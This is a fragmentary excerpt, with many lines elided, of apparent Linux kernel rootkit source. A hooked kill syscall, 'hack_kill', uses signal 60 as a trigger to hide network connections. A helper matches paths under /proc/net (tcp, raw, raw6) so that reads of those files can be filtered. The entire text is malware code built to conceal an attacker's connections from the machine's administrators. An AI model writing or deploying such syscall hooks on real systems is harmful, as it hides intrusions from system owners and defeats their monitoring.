...
static asmlinkage int hack_kill(const struct pt_regs *regs)
{
    ...
    /* Network connection hiding controls */
    else if (sig == 60)
    {
...
/* helper function to check if path is a network proc file */
static bool is_proc_net_file(const char __user *filename) {
    char path[256];
    ...
    return (strstr(path, "/proc/net/tcp") != NULL ||
            ...
            strstr(path, "/proc/net/raw") != NULL ||
            strstr(path, "/proc/net/raw6") != NULL);
}
